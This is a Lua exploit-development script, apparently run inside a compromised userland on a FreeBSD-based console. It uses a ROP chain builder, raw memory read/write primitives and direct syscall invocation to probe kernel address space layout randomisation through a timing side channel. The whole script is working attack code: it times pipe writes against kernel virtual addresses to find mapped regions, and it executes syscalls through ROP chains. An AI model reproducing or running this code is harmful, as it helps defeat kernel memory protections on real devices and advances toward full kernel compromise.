-- CRASH_CLASS: LOW
-- PROBE 171a: KASLR timing via ropchain + fcall_with_rax
--
-- 129b showed: native.fcall_with_rax(stub, syscall_no, args...) works
-- where stub = syscall.pipe.fn_addr
--
-- Strategy: use ropchain builder for tight loops that measure
-- write(pipe, kernel_va, 1) timing with clock_gettime bookends.
-- Also test: ropchain:gen_loop for automated amplification.
--
-- Additionally explore if ropchain can build a custom syscall
-- chain that avoids Lua→C overhead entirely.

print("=== PROBE 171a: ROPCHAIN KASLR TIMING ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local stub = syscall.pipe.fn_addr
print("stub=" .. tostring(stub))

-- [A] Verify fcall_with_rax with correct API
print("")
print("--- [A] VERIFY FCALL_WITH_RAX ---")

local ok1, rv1 = pcall(native.fcall_with_rax, stub, 20)
if ok1 then
    print("getpid=" .. to_num(rv1) .. " (expected " .. pid .. ")")
else
    print("getpid FAILED: " .. tostring(rv1))
end

local ok2, rv2 = pcall(native.fcall_with_rax, stub, 24)
if ok2 then
    print("getuid=" .. to_num(rv2))
else
    print("getuid FAILED: " .. tostring(rv2))
end

-- [B] Create pipe for timing test
print("")
print("--- [B] PIPE + TIMING SETUP ---")
local ok3, rv3 = pcall(native.fcall_with_rax, stub, 42)
local pipe_rd = -1
if ok3 then
    pipe_rd = to_num(rv3)
    print("pipe read_fd=" .. pipe_rd .. " write_fd=" .. (pipe_rd + 1))
else
    print("pipe FAILED: " .. tostring(rv3))
end

-- Allocate GPU buffer for timing data
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- [C] Timing calibration via fcall_with_rax
print("")
print("--- [C] FCALL TIMING CALIBRATION ---")

-- clock_gettime(CLOCK_MONOTONIC=4, ts_buf) via fcall
local TS1 = 0x10000
local TS2 = 0x10100

-- Measure fcall overhead
local ITERS = 50

-- Warmup
for i = 1, 5 do
    pcall(native.fcall_with_rax, stub, 20)
end

-- time N getpid calls
pcall(native.fcall_with_rax, stub, 232, 4, ga(TS1))
for i = 1, ITERS do
    pcall(native.fcall_with_rax, stub, 20)
end
pcall(native.fcall_with_rax, stub, 232, 4, ga(TS2))

local s1 = to_num(memory.read_dword(gpu + TS1))
local ns1 = to_num(memory.read_dword(gpu + TS1 + 8))
local s2 = to_num(memory.read_dword(gpu + TS2))
local ns2 = to_num(memory.read_dword(gpu + TS2 + 8))
local elapsed_ns = (s2 - s1) * 1000000000 + (ns2 - ns1)
print("fcall overhead: " .. ITERS .. " getpid in " .. elapsed_ns .. "ns (" ..
    math.floor(elapsed_ns / ITERS) .. " ns/call)")

-- [D] Timing: write(pipe, user_addr, 1) vs write(pipe, kva, 1)
print("")
print("--- [D] WRITE TIMING COMPARISON ---")

if pipe_rd >= 0 then
    -- Write 1 byte from user buffer (should succeed)
    memory.write_dword(gpu + 0x20000, 0x41)

    local READ_ITERS = 30

    -- Measure user VA write
    pcall(native.fcall_with_rax, stub, 232, 4, ga(TS1))
    for i = 1, READ_ITERS do
        pcall(native.fcall_with_rax, stub, 4, pipe_rd + 1, ga(0x20000), 1)
        pcall(native.fcall_with_rax, stub, 3, pipe_rd, ga(0x20100), 1)
    end
    pcall(native.fcall_with_rax, stub, 232, 4, ga(TS2))

    s1 = to_num(memory.read_dword(gpu + TS1))
    ns1 = to_num(memory.read_dword(gpu + TS1 + 8))
    s2 = to_num(memory.read_dword(gpu + TS2))
    ns2 = to_num(memory.read_dword(gpu + TS2 + 8))
    local user_ns = (s2 - s1) * 1000000000 + (ns2 - ns1)
    print("user_VA write+read x" .. READ_ITERS .. ": " .. user_ns .. "ns (" ..
        math.floor(user_ns / READ_ITERS) .. " ns/pair)")

    -- Measure kernel VA write (should fail immediately at copyin)
    -- Test addresses at 32MB intervals across first 2GB of kernel VA
    local kva_times = {}
    for chunk = 0, 15 do
        local kva_off = chunk * 0x2000000
        local kva = uint64(string.format("0xFFFF8000%08X", kva_off))

        pcall(native.fcall_with_rax, stub, 232, 4, ga(TS1))
        for i = 1, READ_ITERS do
            pcall(native.fcall_with_rax, stub, 4, pipe_rd + 1, kva, 1)
        end
        pcall(native.fcall_with_rax, stub, 232, 4, ga(TS2))

        s1 = to_num(memory.read_dword(gpu + TS1))
        ns1 = to_num(memory.read_dword(gpu + TS1 + 8))
        s2 = to_num(memory.read_dword(gpu + TS2))
        ns2 = to_num(memory.read_dword(gpu + TS2 + 8))
        local kva_ns = (s2 - s1) * 1000000000 + (ns2 - ns1)
        kva_times[chunk] = kva_ns
        print(string.format("  kva+0x%08X: %dns (%d ns/call) diff=%dns",
            kva_off, kva_ns, math.floor(kva_ns / READ_ITERS),
            kva_ns - user_ns))
    end

    -- Look for outliers (timing difference suggests different page table state)
    local sum = 0
    for _, t in pairs(kva_times) do sum = sum + t end
    local avg = sum / 16
    print("")
    print("avg_kva=" .. math.floor(avg) .. "ns")
    for chunk = 0, 15 do
        local diff = math.abs(kva_times[chunk] - avg)
        if diff > avg * 0.1 then
            print("  OUTLIER chunk " .. chunk ..
                " (0xFFFF8000+" .. string.format("0x%08X", chunk * 0x2000000) ..
                "): " .. kva_times[chunk] .. "ns (diff=" ..
                math.floor(diff) .. ")")
        end
    end

    -- Close pipe
    pcall(native.fcall_with_rax, stub, 6, pipe_rd)
    pcall(native.fcall_with_rax, stub, 6, pipe_rd + 1)
end

-- [E] Try ropchain for tighter timing
print("")
print("--- [E] ROPCHAIN METHODS ---")
-- Just list ropchain methods to understand API
local methods = {}
for k, v in pairs(ropchain) do
    if type(v) == "function" then
        table.insert(methods, k)
    end
end
table.sort(methods)
print("ropchain methods: " .. #methods)
for _, m in ipairs(methods) do
    print("  " .. m)
end

-- [F] Build a simple ropchain syscall (getpid)
print("")
print("--- [F] ROPCHAIN SYSCALL ---")
local chain = ropchain:new()
chain:push_syscall_with_ret(make_syscall(20))
chain:restore_through_longjmp()
chain:execute_through_coroutine()
local chain_rv = memory.read_qword(chain:get_last_retval_addr())
print("ropchain getpid=" .. to_num(chain_rv) .. " (expected " .. pid .. ")")

-- [G] Time a chain of N syscalls (much tighter than fcall loop)
print("")
print("--- [G] ROPCHAIN BATCH TIMING ---")
local BATCH = 20

-- Build chain: clock_gettime + N x getpid + clock_gettime
local sc_cgt = make_syscall(232)
local sc_gp = make_syscall(20)

local chain2 = ropchain:new()
-- Store initial time
local ts_start = memory.alloc(16)
local ts_end = memory.alloc(16)

-- We need to figure out how to pass arguments
-- push_syscall_with_ret seems to use the syscall object's args
-- Let's try building with push_fcall_with_ret instead

-- Alternative: measure via Lua-level timing using os.clock or similar
-- Actually let's just measure the raw chain execution time
pcall(native.fcall_with_rax, stub, 232, 4, ga(TS1))

local chain3 = ropchain:new()
for i = 1, BATCH do
    chain3:push_syscall(sc_gp)
end
chain3:restore_through_longjmp()
chain3:execute_through_coroutine()

pcall(native.fcall_with_rax, stub, 232, 4, ga(TS2))

s1 = to_num(memory.read_dword(gpu + TS1))
ns1 = to_num(memory.read_dword(gpu + TS1 + 8))
s2 = to_num(memory.read_dword(gpu + TS2))
ns2 = to_num(memory.read_dword(gpu + TS2 + 8))
elapsed_ns = (s2 - s1) * 1000000000 + (ns2 - ns1)
print("ropchain batch " .. BATCH .. " getpid: " .. elapsed_ns .. "ns (" ..
    math.floor(elapsed_ns / BATCH) .. " ns/syscall)")

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
